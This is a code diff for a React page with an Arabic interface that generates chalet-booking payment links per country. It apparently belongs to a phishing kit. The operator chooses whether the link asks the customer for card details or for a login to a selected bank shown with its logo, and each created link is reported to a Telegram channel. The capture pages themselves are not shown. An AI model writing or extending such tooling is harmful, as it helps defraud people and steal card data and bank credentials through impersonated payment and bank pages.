@@ -12,12 +12,23 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import { getCountryByCode } from "@/lib/countries";
-import { formatCurrency, getCurrencyCode } from "@/lib/countryCurrencies";
+import { formatCurrency, getCurrencyCode, getCurrencyName, getCurrencySymbol } from "@/lib/countryCurrencies";
 import { getBanksByCountry } from "@/lib/banks";
 import { useChalets, useCreateLink } from "@/hooks/useSupabase";
 import { getCurrency, getDefaultTitle } from "@/utils/countryData";
-import { ArrowRight, Home, Copy, Check, Building2 } from "lucide-react";
+import { generatePaymentLink } from "@/utils/paymentLinks";
+import { sendToTelegram } from "@/lib/telegram";
+import { ArrowRight, Home, Copy, Check, Building2, CreditCard, ExternalLink, Calendar, Users } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import TelegramTest from "@/components/TelegramTest";
+import {
+  AlertDialog,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
 
 const CreateChaletLink = () => {
   const { country } = useParams<{ country: string }>();
@@ -32,8 +43,13 @@ const CreateChaletLink = () => {
   const [pricePerNight, setPricePerNight] = useState<number>(0);
   const [nights, setNights] = useState<number>(1);
   const [guestCount, setGuestCount] = useState<number>(2);
+  const [checkInDate, setCheckInDate] = useState<string>("");
+  const [checkOutDate, setCheckOutDate] = useState<string>("");
+  const [paymentMethod, setPaymentMethod] = useState("card");
   const [selectedBank, setSelectedBank] = useState<string>("");
-  const [createdLink, setCreatedLink] = useState<string | null>(null);
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
+  const [linkId, setLinkId] = useState("");
   const [copied, setCopied] = useState(false);
   
   const selectedChalet = chalets?.find((c) => c.id === selectedChaletId);
@@ -51,16 +67,42 @@ const CreateChaletLink = () => {
   const handleCreate = async () => {
     if (!selectedChalet || !countryData) return;
 
+    if (!checkInDate || !checkOutDate) {
+      toast({
+        title: "خطأ",
+        description: "الرجاء تحديد تواريخ الدخول والخروج",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (paymentMethod === "bank_login" && !selectedBank) {
+      toast({
+        title: "خطأ",
+        description: "الرجاء اختيار البنك",
+        variant: "destructive",
+      });
+      return;
+    }
+
     const payload = {
       chalet_id: selectedChalet.id,
       chalet_name: selectedChalet.name,
       price_per_night: pricePerNight,
       nights,
       guest_count: guestCount,
+      check_in_date: checkInDate,
+      check_out_date: checkOutDate,
       total_amount: totalAmount,
       currency: countryData.currency,
       currency_code: getCurrencyCode(country || "SA"),
-      selected_bank: selectedBank || null,
+      payment_method: paymentMethod,
+      selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
+      selectedCountry: country || "SA",
+      city: selectedChalet.city,
+      address: selectedChalet.address,
+      amenities: selectedChalet.amenities,
+      capacity: selectedChalet.capacity,
     };
 
     try {
@@ -71,14 +113,48 @@ const CreateChaletLink = () => {
         payload,
       });
 
-      // Get dynamic currency and title based on country
-      const countryCurrency = getCurrency(country);
-      const countryTitle = getDefaultTitle(country);
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: "chalet",
+        country: country || 'SA'
+      });
 
-      // Generate dynamic microsite URL with currency and title parameters
-      const micrositeUrl = `${window.location.origin}/r/${country}/${link.type}/${link.id}?currency=${countryCurrency}&title=${encodeURIComponent(countryTitle)}`;
+      const telegramResult = await sendToTelegram({
+        type: 'chalet_link_created',
+        data: {
+          chalet_name: selectedChalet.name,
+          city: selectedChalet.city,
+          check_in_date: checkInDate,
+          check_out_date: checkOutDate,
+          nights,
+          guest_count: guestCount,
+          price_per_night: pricePerNight,
+          total_amount: totalAmount,
+          country: countryData.nameAr,
+          payment_url: paymentUrl
+        },
+        timestamp: new Date().toISOString(),
+        imageUrl: selectedChalet.images?.[0],
+        description: `حجز شاليه ${selectedChalet.name} في ${selectedChalet.city}`
+      });
 
-      setCreatedLink(micrositeUrl);
+      setCreatedPaymentUrl(paymentUrl);
+      setLinkId(link.id);
+      setShowSuccessDialog(true);
+      
+      if (telegramResult.success) {
+        toast({
+          title: "تم إنشاء رابط الحجز بنجاح!",
+          description: "تم إرسال البيانات إلى التليجرام",
+        });
+      } else {
+        console.error('Telegram error:', telegramResult.error);
+        toast({
+          title: "تحذير",
+          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
+          variant: "destructive",
+        });
+      }
     } catch (error) {
       console.error("Error creating link:", error);
       toast({
@@ -89,16 +165,18 @@ const CreateChaletLink = () => {
     }
   };
   
-  const handleCopy = () => {
-    if (createdLink) {
-      navigator.clipboard.writeText(createdLink);
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-      toast({
-        title: "تم النسخ!",
-        description: "تم نسخ الرابط إلى الحافظة",
-      });
-    }
+  const handleCopyLink = () => {
+    navigator.clipboard.writeText(createdPaymentUrl);
+    setCopied(true);
+    setTimeout(() => setCopied(false), 2000);
+    toast({
+      title: "تم النسخ!",
+      description: "تم نسخ الرابط إلى الحافظة",
+    });
+  };
+  
+  const handlePreview = () => {
+    window.open(createdPaymentUrl, '_blank');
   };
   
   if (!countryData) {
@@ -114,112 +192,33 @@ const CreateChaletLink = () => {
     );
   }
   
-  if (createdLink) {
-    return (
-      <div className="min-h-screen py-6" dir="rtl">
-        <div className="container mx-auto px-4">
-          <Card className="max-w-xl mx-auto p-4 text-center">
-            <div className="w-14 h-14 bg-gradient-success rounded-full flex items-center justify-center mx-auto mb-3">
-              <Check className="w-7 h-7 text-white" />
-            </div>
-            
-            <h2 className="text-xl font-bold mb-2">تم إنشاء الرابط بنجاح!</h2>
-            <p className="text-sm text-muted-foreground mb-4">
-              شارك هذا الرابط مع عملائك
-            </p>
 
-            {/* Booking Summary */}
-            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2 text-right">
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">{selectedChalet?.name}</span>
-                <span className="text-muted-foreground">الشاليه:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">{nights} ليلة</span>
-                <span className="text-muted-foreground">المدة:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">{guestCount} ضيف</span>
-                <span className="text-muted-foreground">الضيوف:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm">
-                <span className="font-semibold">
-                  {formatCurrency(pricePerNight, getCurrencyCode(country || "SA"))}
-                </span>
-                <span className="text-muted-foreground">سعر الليلة:</span>
-              </div>
-              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
-                <span className="font-bold text-lg">
-                  {formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}
-                </span>
-                <span className="text-muted-foreground">الإجمالي:</span>
-              </div>
-            </div>
-
-            <div className="bg-secondary/50 p-3 rounded-lg mb-4 break-all">
-              <code className="text-xs">{createdLink}</code>
-            </div>
-
-            <div className="flex gap-3 justify-center">
-              <Button onClick={handleCopy}>
-                {copied ? (
-                  <>
-                    <Check className="w-4 h-4 ml-2" />
-                    <span className="text-sm">تم النسخ</span>
-                  </>
-                ) : (
-                  <>
-                    <Copy className="w-4 h-4 ml-2" />
-                    <span className="text-sm">نسخ الرابط</span>
-                  </>
-                )}
-              </Button>
-
-              <Button
-                variant="outline"
-                onClick={() => window.open(createdLink, "_blank")}
-              >
-                <span className="ml-2 text-sm">عرض المعاينة</span>
-                <ArrowRight className="w-4 h-4 mr-2" />
-              </Button>
-            </div>
-            
-            <Button
-              variant="ghost"
-              className="mt-4 text-sm"
-              onClick={() => navigate("/services")}
-            >
-              إنشاء رابط جديد
-            </Button>
-          </Card>
-        </div>
-      </div>
-    );
-  }
   
   return (
-    <div className="min-h-screen py-6" dir="rtl">
+    <div className="min-h-screen py-6 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
       <div className="container mx-auto px-4">
+        {/* Telegram Test Component */}
+        <div className="mb-6">
+          <TelegramTest />
+        </div>
+        
         <div className="max-w-2xl mx-auto">
-          {/* Header - Minimized */}
-          <div className="mb-4">
-            <div className="flex items-center gap-2 mb-3">
-              <div
-                className="w-10 h-10 rounded-lg flex items-center justify-center"
-                style={{
-                  background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
-                }}
-              >
-                <Home className="w-5 h-5 text-white" />
-              </div>
-              <div>
-                <h1 className="text-xl font-bold">حجز شاليه - {countryData.nameAr}</h1>
-                <p className="text-xs text-muted-foreground">أنشئ رابط حجز مخصص</p>
+
+          
+          <Card className="p-4 shadow-elevated">
+            <div
+              className="h-16 -m-4 mb-4 rounded-t-xl relative"
+              style={{
+                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
+              }}
+            >
+              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
+              <div className="absolute bottom-2 right-4 text-white">
+                <h1 className="text-lg font-bold">إنشاء رابط دفع - شاليه</h1>
+                <p className="text-xs opacity-90">{countryData.nameAr}</p>
               </div>
             </div>
-          </div>
-          
-          <Card className="p-4">
+            
             <div className="space-y-4">
               {/* Chalet Selection */}
               <div>
@@ -292,7 +291,10 @@ const CreateChaletLink = () => {
                   
                   {/* Guest Count */}
                   <div>
-                    <Label className="text-sm mb-2">عدد الضيوف</Label>
+                    <Label className="text-sm mb-2 flex items-center gap-2">
+                      <Users className="w-3 h-3" />
+                      عدد الضيوف
+                    </Label>
                     <Input
                       type="number"
                       min="1"
@@ -303,29 +305,110 @@ const CreateChaletLink = () => {
                     />
                   </div>
                   
-                  {/* Bank Selection (Optional) */}
+                  {/* Check-in Date */}
                   <div>
                     <Label className="text-sm mb-2 flex items-center gap-2">
-                      <Building2 className="w-3 h-3" />
-                      البنك (اختياري)
+                      <Calendar className="w-3 h-3" />
+                      تاريخ الدخول *
                     </Label>
-                    <Select value={selectedBank} onValueChange={setSelectedBank}>
-                      <SelectTrigger className="h-9">
-                        <SelectValue placeholder="اختر بنك (يمكن التخطي)" />
+                    <Input
+                      type="date"
+                      value={checkInDate}
+                      onChange={(e) => setCheckInDate(e.target.value)}
+                      min={new Date().toISOString().split("T")[0]}
+                      className="h-9 text-sm"
+                      required
+                    />
+                  </div>
+                  
+                  {/* Check-out Date */}
+                  <div>
+                    <Label className="text-sm mb-2 flex items-center gap-2">
+                      <Calendar className="w-3 h-3" />
+                      تاريخ الخروج *
+                    </Label>
+                    <Input
+                      type="date"
+                      value={checkOutDate}
+                      onChange={(e) => setCheckOutDate(e.target.value)}
+                      min={checkInDate || new Date().toISOString().split("T")[0]}
+                      className="h-9 text-sm"
+                      required
+                    />
+                  </div>
+                  
+                  {/* Payment Method Selection */}
+                  <div>
+                    <Label className="text-sm mb-2 flex items-center gap-2">
+                      <CreditCard className="w-3 h-3" />
+                      طريقة الدفع *
+                    </Label>
+                    <Select value={paymentMethod} onValueChange={setPaymentMethod}>
+                      <SelectTrigger className="h-10">
+                        <SelectValue placeholder="اختر طريقة الدفع" />
                       </SelectTrigger>
-                      <SelectContent>
-                        <SelectItem value="skip">بدون تحديد بنك</SelectItem>
-                        {banks.map((bank) => (
-                          <SelectItem key={bank.id} value={bank.id}>
-                            {bank.nameAr}
-                          </SelectItem>
-                        ))}
+                      <SelectContent className="bg-background">
+                        <SelectItem value="card">
+                          <div className="flex items-center gap-2">
+                            <CreditCard className="w-4 h-4" />
+                            <span>بيانات البطاقة</span>
+                          </div>
+                        </SelectItem>
+                        <SelectItem value="bank_login">
+                          <div className="flex items-center gap-2">
+                            <Building2 className="w-4 h-4" />
+                            <span>تسجيل دخول البنك</span>
+                          </div>
+                        </SelectItem>
                       </SelectContent>
                     </Select>
                     <p className="text-xs text-muted-foreground mt-1">
-                      💡 يمكن للعميل اختيار أو تغيير البنك أثناء الدفع
+                      {paymentMethod === "card" 
+                        ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
+                        : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                     </p>
                   </div>
+                  
+                  {/* Bank Selection (Only for bank_login) */}
+                  {paymentMethod === "bank_login" && (
+                    <div>
+                      <Label className="text-sm mb-2 flex items-center gap-2">
+                        <Building2 className="w-3 h-3" />
+                        اختر البنك *
+                      </Label>
+                      <Select value={selectedBank} onValueChange={setSelectedBank}>
+                        <SelectTrigger className="h-10">
+                          <SelectValue placeholder="اختر البنك" />
+                        </SelectTrigger>
+                        <SelectContent className="bg-background">
+                          {banks.length > 0 ? (
+                            banks.map((bank) => (
+                              <SelectItem key={bank.id} value={bank.id}>
+                                <div className="flex items-center gap-2">
+                                  {bank.logo && (
+                                    <img 
+                                      src={bank.logo} 
+                                      alt={bank.nameAr}
+                                      className="h-5 w-5 object-contain"
+                                      onError={(e) => e.currentTarget.style.display = 'none'}
+                                    />
+                                  )}
+                                  <span>{bank.nameAr}</span>
+                                </div>
+                              </SelectItem>
+                            ))
+                          ) : (
+                            <SelectItem value="no-bank" disabled>
+                              لا توجد بنوك متاحة
+                            </SelectItem>
+                          )}
+                        </SelectContent>
+                      </Select>
+                      <p className="text-xs text-muted-foreground mt-1">
+                        💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
+                      </p>
+                    </div>
+                  )}
                   
                   {/* Total Amount */}
                   <div className="bg-gradient-primary p-4 rounded-xl text-primary-foreground">
@@ -359,6 +442,96 @@ const CreateChaletLink = () => {
           </Card>
         </div>
       </div>
+      
+      {/* Success Dialog with Copy and Preview buttons */}
+      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <AlertDialogContent className="max-w-md" dir="rtl">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-xl text-center">
+              ✅ تم إنشاء رابط الحجز بنجاح!
+            </AlertDialogTitle>
+            <AlertDialogDescription className="text-center">
+              يمكنك نسخ الرابط أو معاينته قبل المتابعة
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+          
+          <div className="my-4">
+            {/* Booking Summary */}
+            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">الشاليه:</span>
+                <span className="font-semibold">{selectedChalet?.name}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">المدينة:</span>
+                <span className="font-semibold">{selectedChalet?.city}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">الدخول:</span>
+                <span className="font-semibold">{checkInDate}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">الخروج:</span>
+                <span className="font-semibold">{checkOutDate}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">عدد الليالي:</span>
+                <span className="font-semibold">{nights} ليلة</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">عدد الضيوف:</span>
+                <span className="font-semibold">{guestCount} ضيف</span>
+              </div>
+              <div className="flex items-center justify-between text-sm pt-2 border-t border-border/50">
+                <span className="text-muted-foreground">الإجمالي:</span>
+                <span className="font-bold text-lg">
+                  {formatCurrency(totalAmount, getCurrencyCode(country || "SA"))}
+                </span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">طريقة الدفع:</span>
+                <span className="font-semibold">
+                  {paymentMethod === "card" ? "بطاقة ائتمان" : "تسجيل دخول البنك"}
+                </span>
+              </div>
+            </div>
+
+            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
+              {createdPaymentUrl}
+            </div>
+
+            <div className="flex gap-2">
+              <Button
+                onClick={handleCopyLink}
+                variant="outline"
+                className="flex-1"
+              >
+                {copied ? (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    تم النسخ!
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    نسخ الرابط
+                  </>
+                )}
+              </Button>
+
+              <Button
+                onClick={handlePreview}
+                variant="outline"
+                className="flex-1"
+              >
+                <ExternalLink className="w-4 h-4 ml-2" />
+                معاينة
+              </Button>
+            </div>
+          </div>
+          
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
